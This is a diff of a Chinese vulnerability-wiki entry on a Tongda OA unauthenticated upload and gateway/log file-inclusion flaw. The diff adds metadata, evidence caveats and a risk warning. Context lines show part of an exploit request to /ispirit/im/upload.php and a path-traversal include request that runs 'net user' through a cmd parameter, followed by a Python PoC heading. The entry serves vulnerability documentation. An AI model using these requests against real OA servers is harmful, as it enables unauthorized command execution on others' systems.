@@ -1,8 +1,49 @@
 ---
 source: "hatch 补库批 20260928"
+title: "通达OA ispirit上传+gateway及dd_error日志包含"
+product: "通达OA"
+record_type: "roundup"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "多系列上传；2015声称无包含，2017mac未修复声明"
+prerequisites: "未授权，但版本分支不同"
+side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
+review_date: "2026-10-02"
+source_status: "unknown"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEoa%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2Brce%2B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.md"
+category_recommendation: "OA / 通达"
+id: "vw-3d40f00bc3be2149f1e65b1f"
+entity_id: "ve-3d40f00bc3be2149f1e65b1f"
+schema_version: "1"
 ---
 
-# 通达oa 任意文件上传+rce+文件包含
+# 通达OA ispirit上传+gateway及dd_error日志包含
+
+## 条目说明
+
+- 对象与具体问题：通达OA；ispirit上传+gateway及dd_error日志包含
+- 版本、配置及部署条件：多系列上传；2015声称无包含，2017mac未修复声明
+- 认证与权限前提：未授权，但版本分支不同
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 保留ddsuite error日志变体及2017补丁缺口，不能合并丢掉
+- 2013有包含与235仅11/2017说法冲突，需补丁文件hash和版本矩阵
+- 完整上传包可补转载丢字段；固定2003目录/Windows COM/SYSTEM说法不通用
+- DEST_UID非0描述漏mode2分支；上传生成jpg说法与requests文件名不一致
+
+## 操作风险
+
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
 
 一、漏洞简介
 ------------
@@ -97,8 +138,9 @@ V11版2017版2016版2015版2013增强版2013版
 
 ![](./.resource/通达oa任意文件上传+rce+文件包含/media/rId37.png)
 
-### 请求包
+#### 请求包
 
+```http
     POST /ispirit/im/upload.php HTTP/1.1
     Host: 10.10.20.116:88
     Content-Length: 658
@@ -146,8 +188,10 @@ V11版2017版2016版2015版2013增强版2013版
     Content-Type: application/x-www-form-urlencoded
 
     json={"url":"/general/../../attach/im/2003/938379153.jpg"}&cmd=net user
+```
 
-### poc （上传+文件包含+rce）
+
+#### poc （上传+文件包含+rce）
 
     import os
     import requests
